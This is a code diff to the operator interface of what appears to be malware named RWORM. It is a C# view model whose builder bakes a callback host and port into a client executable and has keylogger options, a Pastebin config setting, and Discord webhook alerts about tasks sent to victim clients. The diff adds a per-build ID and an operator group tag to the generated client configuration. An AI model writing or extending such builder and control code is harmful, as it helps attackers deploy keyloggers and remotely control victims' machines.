@@ -36,6 +36,7 @@ namespace RWORM.GUI.ViewModels
         private string _buildHost       = "127.0.0.1";
         private int    _buildPort       = 3333;
         private string _buildOutput     = "RWORM.exe";
+        private string _buildGroupTag   = "default";
 
         // Keylogger builder options
         private bool   _buildKeyloggerEnabled;
@@ -113,9 +114,10 @@ namespace RWORM.GUI.ViewModels
         public string ListenerStatus  { get => _listenerStatus;  set { _listenerStatus  = value; OnPropertyChanged(); } }
 
         // Builder
-        public string BuildHost    { get => _buildHost;    set { _buildHost    = value; OnPropertyChanged(); } }
-        public int    BuildPort    { get => _buildPort;    set { _buildPort    = value; OnPropertyChanged(); } }
-        public string BuildOutput  { get => _buildOutput;  set { _buildOutput  = value; OnPropertyChanged(); } }
+        public string BuildHost     { get => _buildHost;     set { _buildHost     = value; OnPropertyChanged(); } }
+        public int    BuildPort     { get => _buildPort;     set { _buildPort     = value; OnPropertyChanged(); } }
+        public string BuildOutput   { get => _buildOutput;   set { _buildOutput   = value; OnPropertyChanged(); } }
+        public string BuildGroupTag { get => _buildGroupTag; set { _buildGroupTag = value; OnPropertyChanged(); } }
 
         public bool   BuildKeyloggerEnabled { get => _buildKeyloggerEnabled; set { _buildKeyloggerEnabled = value; OnPropertyChanged(); } }
         public bool   BuildKeyloggerOnline  { get => _buildKeyloggerOnline;  set { _buildKeyloggerOnline  = value; OnPropertyChanged(); } }
@@ -1037,7 +1039,7 @@ namespace RWORM.GUI.ViewModels
             }
         }
 
-        public async Task SendTaskDiscordAlertAsync(string title, string description, string taskName, string targetClient, string mode, string content = null)
+        public async Task SendTaskDiscordAlertAsync(string title, string description, string taskName, string targetClient, string mode, string? content = null)
         {
             var url = TaskDiscordWebhook;
             if (!TaskDiscordAlert || string.IsNullOrWhiteSpace(url) || !url.StartsWith("http", StringComparison.OrdinalIgnoreCase))
@@ -1071,8 +1073,8 @@ namespace RWORM.GUI.ViewModels
                     }
                 };
                 var json = System.Text.Json.JsonSerializer.Serialize(payload);
-                using var content = new System.Net.Http.StringContent(json, System.Text.Encoding.UTF8, "application/json");
-                await client.PostAsync(url, content).ConfigureAwait(false);
+                using var httpContent = new System.Net.Http.StringContent(json, System.Text.Encoding.UTF8, "application/json");
+                await client.PostAsync(url, httpContent).ConfigureAwait(false);
             }
             catch { }
         }
@@ -1419,6 +1421,15 @@ namespace RWORM.GUI.ViewModels
                 cfg = System.Text.RegularExpressions.Regex.Replace(
                     cfg, @"PastebinRaw\s*=\s*""[^""]*""",
                     $"PastebinRaw     = \"{BuildPastebinRaw.Replace("\"", "\\\"")}\"");
+
+                // Build Identity — fresh UUID per build; GroupTag baked in as operator label
+                var newBuildId = System.Guid.NewGuid().ToString();
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"BuildId\s*=\s*""[^""]*""",
+                    $"BuildId   = \"{newBuildId}\"");
+                cfg = System.Text.RegularExpressions.Regex.Replace(
+                    cfg, @"GroupTag\s*=\s*""[^""]*""",
+                    $"GroupTag  = \"{BuildGroupTag.Replace("\"", "\\\"")}\"");
 
                 System.IO.File.WriteAllText(clientConfigPath, cfg);
 
